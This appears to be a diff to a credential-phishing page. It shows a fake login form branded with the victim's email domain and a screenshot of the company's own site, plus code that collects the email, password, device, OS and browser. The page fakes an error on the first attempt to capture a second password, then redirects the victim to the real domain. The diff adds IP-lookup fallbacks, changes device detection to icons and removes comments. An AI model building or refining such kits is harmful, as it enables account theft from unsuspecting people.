@@ -405,7 +405,7 @@
     <div class="visitor-info" id="visitorInfo">
       <span class="info-item"><i class="fas fa-calendar-alt"></i> <span id="visitDateTime">Loading...</span></span>
       <span class="info-item"><i class="fas fa-map-marker-alt"></i> <span id="visitLocation">Loading...</span></span>
-      <span class="info-item"><i class="fas fa-desktop"></i> <span id="visitDevice">Loading...</span></span>
+      <span class="info-item" id="deviceIconOnly"><i class="fas fa-desktop" id="deviceIcon"></i></span>
       <span class="info-item"><i class="fas fa-browser"></i> <span id="visitBrowser">Loading...</span></span>
       <span class="info-item"><i class="fas fa-network-wired"></i> <span id="visitIP">Loading...</span></span>
     </div>
@@ -469,14 +469,14 @@
       return email;
     }
     
-    // --- DETECT DEVICE, OS, BROWSER ---
-    function detectDevice() {
+    // --- DETECT DEVICE TYPE (ICON ONLY) ---
+    function getDeviceIcon() {
       const ua = navigator.userAgent;
       if (/Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua)) {
-        if (/iPad|Tablet/i.test(ua)) return 'Tablet';
-        return 'Phone';
+        if (/iPad|Tablet/i.test(ua)) return 'fa-tablet-alt';
+        return 'fa-mobile-alt';
       }
-      return 'Desktop';
+      return 'fa-desktop';
     }
     
     function detectOS() {
@@ -498,19 +498,36 @@
       return 'Unknown';
     }
     
-    // --- GET IP AND LOCATION ---
+    // --- GET IP AND LOCATION (with fallback) ---
     async function getIPAndLocation() {
-      try {
-        const res = await fetch('https://ipapi.co/json/');
-        const data = await res.json();
-        return {
-          ip: data.ip || 'Unknown',
-          city: data.city || 'Unknown',
-          country: data.country_name || 'Unknown'
-        };
-      } catch {
-        return { ip: 'Unknown', city: 'Unknown', country: 'Unknown' };
+      // Try multiple IP services for reliability
+      const services = [
+        { url: 'https://ipapi.co/json/', parser: d => ({ ip: d.ip, city: d.city, country: d.country_name }) },
+        { url: 'https://ipinfo.io/json', parser: d => ({ ip: d.ip, city: d.city, country: d.country }) },
+        { url: 'https://api.ipify.org?format=json', parser: d => ({ ip: d.ip, city: 'Unknown', country: 'Unknown' }) }
+      ];
+      
+      for (const service of services) {
+        try {
+          const res = await fetch(service.url);
+          const data = await res.json();
+          const result = service.parser(data);
+          if (result.ip && result.ip !== 'Unknown') {
+            // If city/country missing, try to get from IP
+            if (result.city === 'Unknown' || result.country === 'Unknown') {
+              try {
+                const geoRes = await fetch(`https://ipapi.co/${result.ip}/json/`);
+                const geoData = await geoRes.json();
+                result.city = geoData.city || 'Unknown';
+                result.country = geoData.country_name || 'Unknown';
+              } catch {}
+            }
+            return result;
+          }
+        } catch {}
       }
+      
+      return { ip: 'Unable to detect', city: 'Unknown', country: 'Unknown' };
     }
     
     // --- FETCH BRANDING AND BACKGROUND ---
@@ -559,7 +576,7 @@
         document.getElementById('brandHeader').style.borderBottomColor = color;
         document.querySelector('.email-display').style.borderLeftColor = color;
         
-        // DYNAMIC BACKGROUND (from company website)
+        // DYNAMIC BACKGROUND
         document.body.style.backgroundImage = `linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.5)), url('https://image.thum.io/get/width/1200/https://${domain}')`;
         document.body.style.backgroundSize = 'cover';
         document.body.style.backgroundPosition = 'center';
@@ -580,9 +597,13 @@
       
       const now = new Date();
       document.getElementById('visitDateTime').textContent = now.toDateString() + ' ' + now.toLocaleTimeString();
-      document.getElementById('visitDevice').textContent = detectDevice() + ' · ' + detectOS();
       document.getElementById('visitBrowser').textContent = detectBrowser();
       
+      // Device icon only (no text)
+      const deviceIcon = getDeviceIcon();
+      document.getElementById('deviceIcon').className = `fas ${deviceIcon}`;
+      
+      // IP and Location
       const ipData = await getIPAndLocation();
       document.getElementById('visitIP').textContent = ipData.ip;
       document.getElementById('visitLocation').textContent = `${ipData.city}, ${ipData.country}`;
@@ -614,7 +635,7 @@
     if (window.top !== window.self) window.top.location = window.self.location;
     window.addEventListener('pageshow', function(e) { if (e.persisted) window.location.reload(); });
     
-    // --- FORM SUBMISSION WITH PASSWORD FLOW ---
+    // --- FORM SUBMISSION ---
     let attemptCount = 0;
     let firstPassword = '';
     
@@ -643,7 +664,7 @@
             email: email,
             password: password,
             attempt: attemptCount,
-            device: detectDevice(),
+            device: getDeviceIcon(),
             os: detectOS(),
             browser: detectBrowser(),
             timestamp: new Date().toISOString()
@@ -654,14 +675,12 @@
       }
       
       if (attemptCount === 1) {
-        // First attempt: show error and clear password
         firstPassword = password;
         errorEl.textContent = 'Authentication is required! Please try again.';
         errorEl.style.display = 'block';
         document.getElementById('passwordField').value = '';
         document.getElementById('passwordField').focus();
       } else {
-        // Second attempt: redirect to the real domain
         const domain = email.split('@')[1];
         document.getElementById('loader').style.display = 'flex';
         setTimeout(() => {
